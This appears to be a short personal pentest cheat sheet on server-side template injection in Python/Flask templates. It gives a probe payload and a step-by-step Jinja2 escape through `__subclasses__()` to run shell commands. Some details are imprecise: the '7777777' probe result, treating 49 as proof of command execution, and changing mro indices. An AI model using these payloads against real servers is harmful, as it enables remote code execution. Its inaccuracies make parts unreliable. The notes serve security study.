---
exploit: template-injection
language: python
tags: python
---


```ad-note
more info: [Hacker One report](https://hackerone.com/reports/125980)
```

This occurs on python web servers, with templates, mainly flask.

You can test for it with: `{{7 * 7}}`.
If that returns __49__ or maybe even __7777777__, then it worked, and you have command execution.

Exploit code:
```python
{{''.__class__.mro()[1].__subclasses__()}} 
```
This checks for commands we can execute. 

```ad-note
Try changing the int `1` to several things.
```

If you find something like `subprocess.popen`, you are good. Then you have to find the number of it. Put that in the place of __x__.

```python
{{''.__class__.mro()[1].__subclasses__()[X]}}
```

And in the end, just enter the command you want after it with brackets:

```python
{{''.__class__.mro()[1].__subclasses__()[X](COMMAND)}}
```

A final command might look something like this:

```python
{{''.__class__.mro()[2].__subclasses__()[233]("ls")}}
```


